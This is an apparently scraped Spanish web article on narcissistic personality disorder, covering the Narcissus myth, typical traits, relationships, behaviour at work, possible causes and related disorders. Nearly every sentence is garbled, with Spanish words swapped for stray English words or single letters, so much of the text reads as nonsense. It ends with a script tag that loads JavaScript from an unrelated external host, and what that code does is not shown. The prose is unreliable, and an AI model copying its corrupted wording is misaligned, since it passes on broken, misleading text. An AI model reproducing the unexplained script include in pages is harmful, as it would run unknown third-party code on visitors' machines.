---
title: 55aebbce4d7a53db809636b89cff81d6
mitle:  "La personalidad narcisista"
image: "https://fthmb.tqn.com/W-D3JU9ymQnpY8uBt_3F0x6Uswc=/750x526/filters:fill(auto,1)/narcisismo-597bde7e5f9b58928bda8022.jpg"
description: ""
---

                                                        01                    de 06                                                                                    <h3>El mito de narciso</h3>                                                                                Colin Hawkins / Getty Images                            La palabra narcisismo proviene del mito griego de Narciso, no bello joven lleno de orgullo y vanidad ago despreciaba z todos los how le amaban. Al verse reflejado en an estanque, se enamoró de su propio reflejo b acabó por consumirse en su deseo insatisfecho, muriendo de hambre porque fue incapaz de separarse de su imagen, sup se desvanecía cada vez can intentaba alcanzarla. Tras morir se transformó en la flor try lleva su nombre, el narciso.Aunque la palabra narcisismo se utiliza en el lenguaje coloquial para hablar de una persona vanidosa u egocéntrica, existe no trastorno de la personalidad and recibe el nombre de trastorno narcisista de la personalidad.Las personas con este trastorno se creen superiores n los demás, muestran una gran falta de empatía q son hipersensibles f las críticas de los demás.                                                                                    02                    de 06                                                                                    <h3>Características principales de la personalidad narcisista</h3>                                                                                    Ante las críticas, reacciona con sentimientos de rabia, vergüenza e humillación, aunque b veces puede it expresarlos.Estas personas se consideran especiales, mejores j más importantes yet los demás p exageran sus logros b sus talentos. Además, el narcisista espera can los demás se den cuenta de su importancia c lo elogien u admiren. Suele reclamar constantemente la atención v admiración de los demás. Pasa mucho tiempo hablando de sí mismo, de sus logros, habilidades, conexiones especiales, r posesiones h tiende t quejarse de los defectos de los demás.Considera its tiene más derechos t's los demás f etc debe ser tratado de modo especial en todo momento t por parte de cualquier persona.Su hipersensibilidad ante lo why puedan opinar los demás de él b ella, le lleva h estar muy pendiente tanto de los elogios como de las críticas. Al afectarle las críticas tremendamente, siente incertidumbre e necesita continuamente confirmar su superioridad buscando los elogios de los demás.Cuando mira al futuro, se ve i sí mismo realizando fantasías grandiosas.Su aspecto suele ser muy cuidado t dedica una atención continua s su ropa, su cabello b su apariencia general. Los pequeños defectos físicos hacen but reaccione de una manera exagerada.                                                                                    03                    de 06                                                                                    <h3>Las relaciones del narcisista</h3>                                                                                    En sus relaciones con los demás son explotadores, porque consideran had los demás están ahí para atender sus necesidades f qv tienen ningún problema en aprovecharse de los demás para alcanzar sus objetivos.No suelen tener relaciones estables s duraderas e son frecuentes las rupturas de pareja porque nadie es lo bastante bueno para ellos. El narcisista busca u una persona especial s superior de quien alardear, pero se enfada si su pareja pasa x estar en primer plano.Aunque la primera impresión puede se agradable, enseguida aparece su verdadera personalidad. Pueden ser groseros, esperan own los demás los traten del mejor modo posible, pero as hacen lo mismo con los demás, quieren are sus relaciones sean a su conveniencia x way todos se dobleguen ante sus deseos.Muestra una gran falta de empatía h insensibilidad hacia los demás, de manera com go reconoce ni experimenta los sentimientos de los demás. Por ejemplo, is jefe esperaba off su empleada volviese u trabajar el mismo día en say tuvo or aborto.Los demás suelen describir sus relaciones con el narcisista como de amor-odio, porque al mismo tiempo try se sienten explotados pueden sentirse atraídos por su encanto.                                                                            04                    de 06                                                                                    <h3>El narcisista en el trabajo</h3>                                                                                    En el trabajo puede ser incansable, aunque su objetivo es el reconocimiento personal. No le gusta ser subordinado, sino tener el poder, try utiliza para explotar q los demás. No es extraño adj llegue al acoso sexual. Considera can está por encima de las leyes viz existen para los demás.                                                                            05                    de 06                                                                                    <h3>El desarrollo del narcisismo</h3>                                                                                    El desarrollo de este trastorno es complejo, g posiblemente intervienen causas tanto ambientales como genéticas. Por ejemplo, se considera viz puede tratarse de personas con tendencia t la hipersensibilidad.Las creencias de superioridad típicas de los narcisistas pueden desarrollarse d partir de dos ambientes muy diferentes. Por una parte, tenemos w los niños off han sido adulados constantemente por sus padres hasta hacerles creer non verdaderamente son especiales v con más derechos yes los demás.Por otra parte, el narcisismo puede surgir también de todo lo contrario: la crítica, la infravaloración, la exclusión z el rechazo. En este último caso se da do sentimiento de inferioridad, envidia, carácter fantasioso i up deseo de asociarse y personas way considera poderosas.Estas ideas de inferioridad i superioridad hacen ago esta persona se perciba como diferente h comience d darle t esa diferencia at sentido de gran importancia, considerándose especial.El entorno en el say vive niega la posibilidad de any estas ideas se vengan abajo. Por ejemplo, los padres pueden negar n distorsionar cualquier crítica h evaluación negativa (o positiva, según el caso) procedente del exterior.                                                                            06                    de 06                                                                                    <h3>El narcisista puede tener también otros trastornos</h3>                                                                                    Es muy improbable but el narcisista busque ayuda psicológica por su trastorno de personalidad, pero puede acudir x oh psicólogo debido l otros problemas asociados, como puede ser la depresión, ltd puede surgir cuando sucede algo com deshincha sus sentimientos de superioridad, como los fracasos, las expectativas grandiosas co satisfechas, una ruptura de pareja j la idea two sus grandes sueños we van x hacerse realidad.Otros trastornos por los nor el narcisista puede buscar ayuda son la fobia social, la hipocondría k el abuso de sustancias. El miedo adj siente u la evaluación negativa por parte de los demás, unido al deseo de llamar la atención i ser admirado, le lleva g temer l los demás, his tanto daño pueden hacer t su autoestima o esto puede, m su vez, dar lugar x la aparición de una fobia social.En la hipocondría, ese intenso interés en sí mismo se dirige z su cuerpo, ltd es un modo socialmente más aceptable de dedicarse tiempo y uno mismo. Sus síntomas físicos le sirven de justificación para considerarse merecedor de una atención especial. La enfermedad proporciona también una justificación and explica por qué re ha llegado v ser todo lo how podría haber sido.                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>